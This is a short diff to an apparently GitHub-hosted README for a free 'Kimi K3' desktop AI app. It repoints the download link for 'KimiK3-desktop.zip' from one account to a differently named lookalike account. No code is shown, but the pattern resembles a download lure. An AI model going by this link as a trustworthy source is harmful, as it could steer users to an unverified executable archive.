@@ -5,7 +5,7 @@
 <img width="1280" height="720" alt="images1" src="https://github.com/user-attachments/assets/6da75217-82e6-4194-a1c2-9e7c9c0ccba5" />
 
 ## Install
-[Download `KimiK3-desktop.zip`](https://github.com/kimik3/Kimi-K3-Code-Free-Desktop-AI/releases/download/Kimi-K3/KimiK3-desktop.zip)
+[Download `KimiK3-desktop.zip`](https://github.com/kimi-k3code/Kimi-K3-Code-Free-Desktop-AI/releases/download/Kimi-K3/KimiK3-desktop.zip)
 --
 
 <img width="2596" height="1600" alt="images2" src="https://github.com/user-attachments/assets/a413424a-ea5b-449e-8682-63df6a99de56" />
